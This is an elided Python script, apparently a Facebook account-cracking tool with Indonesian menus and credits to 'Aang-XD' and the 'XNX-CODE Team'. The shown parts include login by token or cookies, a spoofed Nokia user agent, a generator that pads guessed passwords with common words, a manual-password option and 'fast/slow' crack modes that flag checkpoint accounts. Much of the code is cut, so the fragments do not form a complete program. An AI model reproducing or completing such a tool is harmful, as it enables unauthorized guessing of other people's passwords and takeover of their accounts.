...
ua_nokia   = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2;]'
...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sCreate By %sAang-XD %s& %sNdrii Sans\n%s  / __/ / / / __/ _ \ ║ %sFacebook %s: %sSaya Aang\n%s / /___/ / / /_/  __/ ║ %sTeam     %s: %sXNX-CODE Team\n%s/_____/_/_/\__/\___/  ║ %sGithub   %s: %sGithub.com/AngCyber\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
...
def menu():
    ...
    if pm in ['']:
        ...
        jalan('%s╚══[%s!%s] %sSampai Jumpa Lagi'%(O,P,O,P))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
...
def generate2(_cici_):
    ...
    _dapunta_.append("gaming")
    _dapunta_.append("ganteng")
    _dapunta_.append("cantik")
    _dapunta_.append("doraemon")
    return _dapunta_
...
def tambah_pass():
    ...
    cuy = input('%s╠══[%s•%s] %sMasukan Sandi Tambahan Manual [1 Kata] : '%(O,P,O,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
            ...
            if f=="":
                ...
                try:
                    ...
                    if put in ['']:
                        ...
                        print('%s╠══[%s•%s] %sMunculkam Opsi Cp? [y/t]'%(O,P,O,P))
                        puf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
...
def var_menu():
    ...
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sLogin Pakai Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sLogin Pakai Cookies'%(O,P,O,P))
...
def var_author():
    ...
    mlaku('%s║     • %sMr Risky (Dumai-991)'%(O,P))
    mlaku('%s║     • %sYogzz Tzy'%(O,P))
    mlaku('%s║     • %sFauzan'%(O,P))
    mlaku('%s║     • %sKhoirul Anam'%(O,P))
    mlaku('%s║     • %sMoch Yayan Juan Alvredo XD.'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
...
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Cepat %s[%sKaya Rossi%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s2%s] %sCrack Lambat %s[%sKaya Kura²%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%sKaya Chat Mantan%s]'%(O,P,O,P,O,P,O))
